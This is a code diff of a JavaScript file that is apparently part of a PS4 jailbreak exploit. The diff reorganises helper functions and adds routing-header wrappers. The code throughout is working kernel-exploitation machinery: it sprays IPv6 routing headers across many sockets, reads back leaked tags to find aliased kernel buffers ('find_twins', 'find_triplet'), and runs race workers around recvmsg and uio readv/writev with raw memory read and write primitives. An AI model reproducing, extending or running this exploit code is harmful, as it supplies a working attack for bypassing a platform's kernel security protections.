@@ -225,13 +225,7 @@ var nc_clear_buf = malloc(8);
 var spawn_thr_args = malloc(0x80);
 var spawn_tid = malloc(0x8);
 var spawn_cpid = malloc(0x8);
-function TRACE(name, extra) {
-    if (extra !== undefined) {
-        log('[TRACE] ' + name + ' | ' + extra);
-    } else {
-        log('[TRACE] ' + name);
-    }
-}
+
 function get_sockopt(sd, level, optname, optval, optlen) {
   // const len_ptr = malloc(4);
   write32(sockopt_len_ptr, optlen);
@@ -499,6 +493,37 @@ function wait_for(addr, threshold) {
     }
   }
 }
+// =========================
+//  TRACE helper
+// =========================
+function TRACE(name, extra) {
+  if (extra !== undefined) {
+    log('[TRACE] ' + name + ' | ' + extra);
+  } else {
+    log('[TRACE] ' + name);
+  }
+}
+
+// =========================
+//  RTHDR helpers
+// =========================
+function set_rthdr(sd, buf, len) {
+  TRACE('enter set_rthdr', 'sd=' + hex(sd) + ' len=' + len);
+  var ret = set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+  TRACE('leave set_rthdr', 'sd=' + hex(sd) + ' ret=' + hex(ret));
+  return ret;
+}
+
+function get_rthdr(sd, buf, max_len) {
+  TRACE('enter get_rthdr', 'sd=' + hex(sd) + ' max_len=' + max_len);
+  var ret = get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
+  TRACE('leave get_rthdr', 'sd=' + hex(sd) + ' ret=' + hex(ret));
+  return ret;
+}
+
+// =========================
+//  iov_recvmsg workers
+// =========================
 function trigger_iov_recvmsg() {
   TRACE('enter trigger_iov_recvmsg');
 
@@ -539,6 +564,10 @@ function wait_iov_recvmsg() {
 
   TRACE('leave wait_iov_recvmsg');
 }
+
+// =========================
+//  ipv6_spray_and_read worker
+// =========================
 function trigger_ipv6_spray_and_read() {
   TRACE('enter trigger_ipv6_spray_and_read');
 
@@ -575,6 +604,10 @@ function wait_ipv6_spray_and_read() {
   wait_for(spray_ipv6_worker.done, 1);
   TRACE('leave wait_ipv6_spray_and_read');
 }
+
+// =========================
+//  uio_readv workers
+// =========================
 function trigger_uio_readv() {
   TRACE('enter trigger_uio_readv');
 
@@ -615,6 +648,10 @@ function wait_uio_readv() {
 
   TRACE('leave wait_uio_readv');
 }
+
+// =========================
+//  uio_writev workers
+// =========================
 function trigger_uio_writev() {
   TRACE('enter trigger_uio_writev');
 
@@ -655,6 +692,132 @@ function wait_uio_writev() {
 
   TRACE('leave wait_uio_writev');
 }
+
+// =========================
+//  find_twins
+// =========================
+function fill_buffer_64(buf, val, len) {
+  if (!buf || buf.eq(0) || len <= 0) {
+    return;
+  }
+  for (var i = 0; i < len; i += 8) {
+    write64(buf.add(i), val);
+  }
+}
+
+function init_threading() {
+  var jmpbuf = malloc(0x60);
+  if (!jmpbuf || jmpbuf.eq(0)) {
+    return;
+  }
+  setjmp(jmpbuf);
+  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
+  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
+}
+function find_twins() {
+  TRACE('enter find_twins');
+
+  var count = 0;
+  var val, i, j;
+
+  twins[0] = -1;
+  twins[1] = -1;
+
+  var spray_add = spray_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
+
+  while (count < MAX_ROUNDS_TWIN) {
+
+    TRACE('find_twins round start', 'round=' + count);
+
+    // spray phase
+    for (i = 0; i < ipv6_socks.length; i++) {
+      TRACE('find_twins spray write', 'i=' + i);
+      write32(spray_add, RTHDR_TAG | i);
+      read32(spray_add);
+      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+    }
+
+    // leak phase
+    for (i = 0; i < ipv6_socks.length; i++) {
+      write32(leak_add, 0);
+      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+      val = read32(leak_add);
+      j   = val & 0xFFFF;
+
+      TRACE('leak_result', 'i=' + i + ' val=0x' + val.toString(16) + ' j=' + j);
+
+      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
+        twins[0] = i;
+        twins[1] = j;
+        TRACE('twins found', '[' + i + ',' + j + ']');
+        TRACE('leave find_twins');
+        return true;
+      }
+    }
+
+    TRACE('find_twins round end', 'round=' + count);
+    count++;
+  }
+
+  TRACE('find_twins FAILED');
+  TRACE('leave find_twins');
+  return false;
+}
+
+// =========================
+//  find_triplet
+// =========================
+function find_triplet(master, other, iterations) {
+  TRACE('enter find_triplet', 'master=' + master + ' other=' + other);
+
+  if (typeof iterations === 'undefined')
+    iterations = MAX_ROUNDS_TRIPLET;
+
+  var count = 0;
+  var val, i, j;
+
+  var spray_add = spray_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
+
+  while (count < iterations) {
+
+    TRACE('triplet round start', 'round=' + count);
+
+    for (i = 0; i < ipv6_socks.length; i++) {
+      if (i === master || i === other) continue;
+
+      TRACE('triplet spray write', 'i=' + i);
+      write32(spray_add, RTHDR_TAG | i);
+      read32(spray_add);
+      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+    }
+
+    write32(leak_add, 0);
+    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+    val = read32(leak_add);
+    j   = val & 0xFFFF;
+
+    TRACE('triplet leak', 'master=' + master + ' val=0x' + val.toString(16) + ' j=' + j);
+
+    if (j !== master && j !== other && (val & 0xFFFF0000) === RTHDR_TAG) {
+      TRACE('triplet found', j);
+      TRACE('leave find_triplet');
+      return j;
+    }
+
+    TRACE('triplet round end', 'round=' + count);
+    count++;
+  }
+
+  TRACE('triplet FAILED');
+  TRACE('leave find_triplet');
+  return -1;
+}
+
+// =========================
+//  init
+// =========================
 function init() {
   TRACE('enter init');
   log('***** Starting PS4 Jailbreak *****');
@@ -695,16 +858,21 @@ function init() {
   TRACE('leave init');
   return true;
 }
+
+// =========================
+//  setup
+// =========================
 var prev_core = -1;
 var prev_rtprio = -1;
 var cleanup_called = false;
+
 function setup() {
   TRACE('enter setup');
 
   try {
     debug('Preparing netctrl...');
 
-    prev_core = get_current_core();
+    prev_core   = get_current_core();
     prev_rtprio = get_rtprio();
     TRACE('current core/rtprio', 'core=' + prev_core + ' rtprio=' + prev_rtprio);
 
@@ -878,119 +1046,7 @@ function cleanup() {
   set_rtprio(prev_rtprio);
   log('Cleanup completed');
 }
-function fill_buffer_64(buf, val, len) {
-  if (!buf || buf.eq(0) || len <= 0) {
-    return;
-  }
-  for (var i = 0; i < len; i += 8) {
-    write64(buf.add(i), val);
-  }
-}
-function find_twins() {
-    TRACE('enter find_twins');
 
-    var count = 0;
-    var val, i, j;
-    var zeroMemoryCount = 0;
-
-    twins[0] = -1;
-    twins[1] = -1;
-
-    var spray_add = spray_rthdr.add(0x04);
-    var leak_add = leak_rthdr.add(0x04);
-
-    while (count < MAX_ROUNDS_TWIN) {
-
-        TRACE('find_twins round start', 'round=' + count);
-
-        // spray phase
-        for (i = 0; i < ipv6_socks.length; i++) {
-            TRACE('spray write', 'i=' + i);
-            write32(spray_add, RTHDR_TAG | i);
-            read32(spray_add);
-            set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-        }
-
-        // leak phase
-        for (i = 0; i < ipv6_socks.length; i++) {
-            write32(leak_add, 0);
-            get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-            val = read32(leak_add);
-            j = val & 0xFFFF;
-
-            TRACE('leak result', 'i=' + i + ' val=0x' + val.toString(16) + ' j=' + j);
-
-            if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
-                twins[0] = i;
-                twins[1] = j;
-                TRACE('twins found', '[' + i + ',' + j + ']');
-                TRACE('leave find_twins');
-                return true;
-            }
-        }
-
-        TRACE('find_twins round end', 'round=' + count);
-        count++;
-    }
-
-    TRACE('find_twins FAILED');
-    TRACE('leave find_twins');
-    return false;
-}
-function find_triplet(master, other, iterations) {
-    TRACE('enter find_triplet', 'master=' + master + ' other=' + other);
-
-    if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
-
-    var count = 0;
-    var val, i, j;
-
-    var spray_add = spray_rthdr.add(0x04);
-    var leak_add = leak_rthdr.add(0x04);
-
-    while (count < iterations) {
-
-        TRACE('triplet round start', 'round=' + count);
-
-        for (i = 0; i < ipv6_socks.length; i++) {
-            if (i === master || i === other) continue;
-
-            TRACE('triplet spray write', 'i=' + i);
-            write32(spray_add, RTHDR_TAG | i);
-            read32(spray_add);
-            set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-        }
-
-        write32(leak_add, 0);
-        get_rthdr(ipv6_socks[master], leak_rthdr, 8);
-        val = read32(leak_add);
-        j = val & 0xFFFF;
-
-        TRACE('triplet leak', 'master=' + master + ' val=0x' + val.toString(16) + ' j=' + j);
-
-        if (j !== master && j !== other && (val & 0xFFFF0000) === RTHDR_TAG) {
-            TRACE('triplet found', j);
-            TRACE('leave find_triplet');
-            return j;
-        }
-
-        TRACE('triplet round end', 'round=' + count);
-        count++;
-    }
-
-    TRACE('triplet FAILED');
-    TRACE('leave find_triplet');
-    return -1;
-}
-function init_threading() {
-  var jmpbuf = malloc(0x60);
-  if (!jmpbuf || jmpbuf.eq(0)) {
-    return;
-  }
-  setjmp(jmpbuf);
-  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
-  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
-}
 var LOG_MAX_LINES = 38;
 function setup_log_screen() {
   jsmaf.root.children.length = 0;
